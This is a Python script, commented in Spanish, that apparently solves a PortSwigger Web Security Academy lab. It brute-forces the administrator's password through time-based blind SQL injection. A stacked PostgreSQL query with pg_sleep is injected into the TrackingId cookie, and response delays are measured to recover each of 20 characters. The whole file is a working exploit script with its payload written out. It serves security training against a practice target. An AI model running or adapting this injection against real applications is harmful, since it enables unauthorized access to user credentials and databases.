#!/usr/bin/env python3
# Lab: Blind SQL injection with time delays and information retrieval
# Objetivo: Extraer la contraseña del administrador midiendo retardos temporales (pg_sleep)

from pwn import *
import requests
import signal
import sys
import string
import time

# Manejo de cierre ordenado (Ctrl+C)
def def_handler(sig, frame):
    p1.failure("Ataque de fuerza bruta detenido")
    print(f"\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Configuración de caracteres y objetivo
characters = string.ascii_lowercase + string.digits
target_url = "https://0a3e00d004218e53801a35c3000300be.web-security-academy.net"
p1 = log.progress("SQLI")

def makeSQLI():
    password = ""
    p1.status("Iniciando ataque de fuerza bruta basado en tiempo")
    time.sleep(2)
    p2 = log.progress("Password")

    # Iteración sobre los 20 caracteres de la contraseña
    for position in range(1, 21):
        for character in characters:
            # Payload: Si el carácter es correcto, el servidor duerme por 3 segundos
            cookies = {
                'TrackingId': f"test'%3b select case when(username='administrator' and substring(password, {position},1)='{character}') then pg_sleep(3) else pg_sleep(0) end from users-- -",
                'session': "0Vj8dxoJmIzQF8MyDtjXuHORoz7NTXNZ"
            }

            p1.status(f"Posición {position} - Probando: {character}")
            
            start_time = time.time()
            r = requests.get(target_url, cookies=cookies)
            end_time = time.time()

            # Si la respuesta tarda más de 3 segundos, el carácter es correcto
            if end_time - start_time > 3:
                password += character
                p2.status(password)
                break

    p1.success("Ataque completado con éxito")
    print(f"[+] Contraseña encontrada: {password}")

if __name__ == '__main__':
    makeSQLI()
